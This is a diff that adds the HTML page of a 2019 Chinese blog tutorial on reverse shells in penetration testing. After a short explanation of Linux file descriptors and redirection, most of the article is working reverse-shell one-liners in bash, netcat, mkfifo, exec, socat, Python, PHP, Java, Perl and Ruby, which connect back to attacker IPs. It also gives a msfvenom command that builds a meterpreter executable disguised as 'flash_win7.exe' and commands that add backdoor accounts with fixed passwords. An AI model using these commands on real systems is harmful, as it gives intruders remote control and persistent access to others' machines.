@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="反弹shell介绍在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。 反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">
+<meta name="keywords" content="安全,shell,文件描述符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透技术基础之反弹shell详解">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/index.html">
+<meta property="og:site_name" content="Six&#39;s Blog">
+<meta property="og:description" content="反弹shell介绍在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。 反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-05T14:08:43.097Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透技术基础之反弹shell详解">
+<meta name="twitter:description" content="反弹shell介绍在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。 反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>渗透技术基础之反弹shell详解</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/04/03/计网实验之交换机技术/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/03/27/计网实验之Socket网络编程/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&text=渗透技术基础之反弹shell详解"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&is_video=false&description=渗透技术基础之反弹shell详解"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透技术基础之反弹shell详解&body=Check out this article: https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&name=渗透技术基础之反弹shell详解&description=&lt;h3 id=&#34;反弹shell介绍&#34;&gt;&lt;a href=&#34;#反弹shell介绍&#34; class=&#34;headerlink&#34; title=&#34;反弹shell介绍&#34;&gt;&lt;/a&gt;反弹shell介绍&lt;/h3&gt;&lt;p&gt;在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。&lt;/p&gt;
+&lt;p&gt;反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&t=渗透技术基础之反弹shell详解"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell介绍"><span class="toc-number">1.</span> <span class="toc-text">反弹shell介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux文件描述符和重定向"><span class="toc-number">2.</span> <span class="toc-text">Linux文件描述符和重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#文件描述符"><span class="toc-number">2.1.</span> <span class="toc-text">文件描述符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重定向"><span class="toc-number">2.2.</span> <span class="toc-text">重定向</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell实例"><span class="toc-number">3.</span> <span class="toc-text">反弹shell实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bash反弹"><span class="toc-number">3.1.</span> <span class="toc-text">bash反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netcat-NC-反弹"><span class="toc-number">3.2.</span> <span class="toc-text">netcat(NC) 反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec反弹"><span class="toc-number">3.3.</span> <span class="toc-text">exec反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#socat反弹"><span class="toc-number">3.4.</span> <span class="toc-text">socat反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编程语言脚本反弹"><span class="toc-number">3.5.</span> <span class="toc-text">编程语言脚本反弹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom-获取反弹一句话"><span class="toc-number">4.</span> <span class="toc-text">msfvenom 获取反弹一句话</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一句话添加账户"><span class="toc-number">4.1.</span> <span class="toc-text">一句话添加账户</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        渗透技术基础之反弹shell详解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Six's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-28T16:00:00.000Z" itemprop="datePublished">2019-03-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/安全技术/">安全技术</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/shell/">shell</a>, <a class="tag-link" href="/tags/安全/">安全</a>, <a class="tag-link" href="/tags/文件描述符/">文件描述符</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="反弹shell介绍"><a href="#反弹shell介绍" class="headerlink" title="反弹shell介绍"></a>反弹shell介绍</h3><p>在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。</p>
+<p>反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
+<a id="more"></a>
+<p>反弹shell通常被用于因防火墙、权限补足、端口占用等情况下。</p>
+<ol>
+<li>目标主机在内网，无法直接连接</li>
+<li>目标主机IP动态改变</li>
+<li>由于防火墙等的限制，只能目标主机发送请求，不能接收请求</li>
+<li>目标是获取目标主机的shell</li>
+</ol>
+<h3 id="Linux文件描述符和重定向"><a href="#Linux文件描述符和重定向" class="headerlink" title="Linux文件描述符和重定向"></a>Linux文件描述符和重定向</h3><p>谈到反弹shell，就不得不说Linux下的文件描述符和重定向。</p>
+<p>因为反弹shell的书写通常情况下是简短精炼，并且会涉及到Linux的输入输出的重定向。</p>
+<p>像这</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.64.1/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>或者这个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;192.168.64.1&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<p>像上面两条反弹shell中的<code>0&gt;&amp;1</code>，<code>2&gt;&amp;3</code>就是Linux中文件描述符及重定向的写法。</p>
+<h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><p><strong>linux文件描述符</strong>：Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
+<p>文件描述符在形式上是一个非负整数。</p>
+<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
+<ul>
+<li><p>标准输入 stdin <code>0</code> </p>
+</li>
+<li><p>标准输出 stdout <code>1</code></p>
+</li>
+<li><p>错误输出 stderr<code>2</code></p>
+</li>
+</ul>
+<p>在Linux中子进程会继承父进程的文件描述符，所以任何进程都具有这3个文件描述符。</p>
+<h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><p>一条命令执行以前先会按照默认的情况进行绑定，如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
+<p><strong>输出重定向</strong>： <code>&gt;</code>  ；<code>&gt;&gt;</code>  追加输出重定向 </p>
+<p><strong>输入重定向</strong>： <code>&lt;</code>  ；<code>&lt;&lt;</code>  追加输入重定向</p>
+<p>直接使用<code>&gt;</code>或<code>&lt;</code>,是对标准输入或输出的重定向</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command &gt; file1</span><br></pre></td></tr></table></figure>
+<p>假设上面的命令command原本在屏幕上输出，现在就将命令的执行结果【标准输出<code>1</code>】重定向至file1中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command &lt; file1</span><br></pre></td></tr></table></figure>
+<p>Unix 命令也可以从文件获取输入，本来需要从键盘获取输入的命令会转移到文件读取内容。</p>
+<p><code>&gt;&gt;</code>和<code>&lt;&lt;</code>追加的意思是在原来文件内容后面进行追加，如果是<code>&lt;</code>和<code>&gt;</code>是会创建新的文件，在写入内容。</p>
+<p>对于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command &gt; file 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><code>&amp;</code>的含义是将后面的数字当作是文件描述符，如果不加<code>&amp;</code>,在<code>&gt;</code>或<code>&lt;</code>后面的数字会被视作一个文件名。</p>
+<p>重定向命令的解释是从做向右的，所以不同的顺序产生的结果也是不同的。</p>
+<p>所以上面命令含义是，首先将标准输出<code>1</code>重定向至<code>file</code>，又将标准错误输出<code>2</code>重定向至<code>1</code>,所以标准错误输出<code>2</code>也重定向至了<code>file</code>,所以有人也将<code>&amp;</code>视作是将<code>1</code>和<code>2</code>合并的符号，将<code>1</code>和<code>2</code>合并后一起重定向至<code>file</code>。</p>
+<h3 id="反弹shell实例"><a href="#反弹shell实例" class="headerlink" title="反弹shell实例"></a>反弹shell实例</h3><h4 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.175.134/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>命令解释：</p>
+<p>bash -i : bash是Linux下一个常见的shell，<code>-i</code>参数表示产生一个交互式的shell</p>
+<p>/dev/tcp/192.168.175.134/8080 : <code>/dev/tcp|udp/ip/port</code>是一个Linux中比较特殊的一个文件，如果在Linux上访问就会发现这个文件并不存在，其含义是让主机与目标主机<code>ip</code>在端口<code>port</code>建立一个tcp或udp连接</p>
+<p>0&gt;&amp;1：将标准输入<code>0</code>输出重定向至标准输出<code>1</code>。或者可以这么理解，将标准输入<code>0</code>和标准输出<code>1</code>合并，在重定向至<code>1</code>，因为前面已经将标准输出<code>1</code>重定向至<code>/dev/tcp/192.168.175.134/8080</code>，所以现在标准输入<code>0</code>和标准输出<code>1</code>都指向<code>/dev/tcp/192.168.175.134/8080</code>。</p>
+</blockquote>
+<h4 id="netcat-NC-反弹"><a href="#netcat-NC-反弹" class="headerlink" title="netcat(NC) 反弹"></a>netcat(NC) 反弹</h4><p>Netcat反弹也是非常常用的方法，但是linux发行版现在自带的NC都是被阉割过的，无法执行参数<code>-e</code>。</p>
+<p>这时我们需要在目标机上手动安装NC。</p>
+<p>NC的利用过程</p>
+<ol>
+<li><p>在攻击机开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 端口号</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目标机运行反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 攻击机地址 端口号 -t -e /bin/bash</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>-e</code>：参数的含义是程序重定向，这里我们将目标机的bash定向至了我们的攻击机，这就是反弹会来的shell。</p>
+</blockquote>
+</li>
+</ol>
+<p>如果不能重新安装NC也是有办法实现。</p>
+<p>第一步也是在攻击机进行监听，然后在目标机执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+</blockquote>
+<p>或者</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
+<h4 id="exec反弹"><a href="#exec反弹" class="headerlink" title="exec反弹"></a>exec反弹</h4><p>exec可以实现将文件描述符和文件绑定在一起。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 3&lt;&gt;file</span><br></pre></td></tr></table></figure>
+<p>以读写方式将文件描述符<code>3</code>与文件<code>file</code>绑定在一起，当然也可以只赋予一个权限，读或写。</p>
+<p>实现反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333 : 将文件描述符<code>5</code>，以读写的方式绑定在<code>/dev/tcp/192.168.146.129/2333</code>，上文已经讲了，这个命令另目标机与攻击机建立了一个tcp连接。</p>
+<p>cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&1;done ：非常经典的命令。可以换个形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; while read line</span><br><span class="line">&gt; do</span><br><span class="line">&gt;     …</span><br><span class="line">&gt; done &lt; file</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>从文件中依次读取每一行，将其赋值给 line 变量，之后再在循环中对line进行操作。这里不是从文件中读取，而是从管道中读取攻击机传送过来的命令，并将标准输出<code>1</code>和标准错误输出<code>2</code>都重定向到了文件描述符<code>5</code>，也就是攻击机上。</p>
+</blockquote>
+<p>还有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+<h4 id="socat反弹"><a href="#socat反弹" class="headerlink" title="socat反弹"></a>socat反弹</h4><p>Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，其基于socket，可以实现与socket任务，功能与netcat类似，可以看做netcat的加强版。</p>
+<p>在攻击机上进行监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:1234 -</span><br></pre></td></tr></table></figure>
+<p>在目标机上执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:攻击机IP:1234</span><br></pre></td></tr></table></figure>
+<h4 id="编程语言脚本反弹"><a href="#编程语言脚本反弹" class="headerlink" title="编程语言脚本反弹"></a>编程语言脚本反弹</h4><p>第一步在攻击机本地开启TCP8080端口的监听，然后在目标机运行下面脚本。</p>
+<p>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.175.134",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
+<p>php脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("192.168.31.41",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+<p>Java脚本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<p>perl脚本</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+<p>ruby脚本</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
+<p> 有时候获得了shell，但是却没有交互界面，效果也不大，这时就需要python来获取标准的虚拟终端环境。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+<p>可以获得很完美的虚拟终端。</p>
+<h3 id="msfvenom-获取反弹一句话"><a href="#msfvenom-获取反弹一句话" class="headerlink" title="msfvenom 获取反弹一句话"></a>msfvenom 获取反弹一句话</h3><p>强大的MSF框架为我们提供了生成一句话反弹shell的工具，即msfvenom。</p>
+<p>在Metasploit中,我们可以使用msfvenom -l 来查询生成我们所需要的各类命令行一句话。</p>
+<p>部分参数：</p>
+<blockquote>
+<p><code>-p</code> 选择一个载荷<br><code>-l</code> 载荷列表，包括payloads, encoders, nops, platforms, formats, all<br><code>-f</code> 生成的文件格式<br><code>-e</code> 编码方式<br><code>-i</code> 编码次数<br><code>-b</code> 在生成的程序中避免出现的值<br><code>-h</code> 帮助</p>
+</blockquote>
+<p>查看所有的payloads</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads</span><br></pre></td></tr></table></figure>
+<p>生成脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.80.142 lport=443 -f exe X &gt; flash_win7.exe</span><br></pre></td></tr></table></figure>
+<h4 id="一句话添加账户"><a href="#一句话添加账户" class="headerlink" title="一句话添加账户"></a>一句话添加账户</h4><p> <strong>chpasswd 方法</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd newuser;echo "newuser:password"|chpasswd</span><br></pre></td></tr></table></figure>
+<p><strong>useradd -p 方法</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -p `openssl passwd 123456` guest</span><br></pre></td></tr></table></figure>
+<p><strong>echo -e 方法</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd newuwer;echo -e "123456n123456n" |passwd newuser</span><br></pre></td></tr></table></figure>
+<p>参考来源;</p>
+<ol>
+<li>【技术分享】linux各种一句话反弹shell总结 <a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></li>
+<li>Linux 反弹shell（二）反弹shell的本质 <a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a></li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell介绍"><span class="toc-number">1.</span> <span class="toc-text">反弹shell介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux文件描述符和重定向"><span class="toc-number">2.</span> <span class="toc-text">Linux文件描述符和重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#文件描述符"><span class="toc-number">2.1.</span> <span class="toc-text">文件描述符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重定向"><span class="toc-number">2.2.</span> <span class="toc-text">重定向</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell实例"><span class="toc-number">3.</span> <span class="toc-text">反弹shell实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bash反弹"><span class="toc-number">3.1.</span> <span class="toc-text">bash反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netcat-NC-反弹"><span class="toc-number">3.2.</span> <span class="toc-text">netcat(NC) 反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec反弹"><span class="toc-number">3.3.</span> <span class="toc-text">exec反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#socat反弹"><span class="toc-number">3.4.</span> <span class="toc-text">socat反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编程语言脚本反弹"><span class="toc-number">3.5.</span> <span class="toc-text">编程语言脚本反弹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom-获取反弹一句话"><span class="toc-number">4.</span> <span class="toc-text">msfvenom 获取反弹一句话</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一句话添加账户"><span class="toc-number">4.1.</span> <span class="toc-text">一句话添加账户</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&text=渗透技术基础之反弹shell详解"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&is_video=false&description=渗透技术基础之反弹shell详解"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透技术基础之反弹shell详解&body=Check out this article: https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
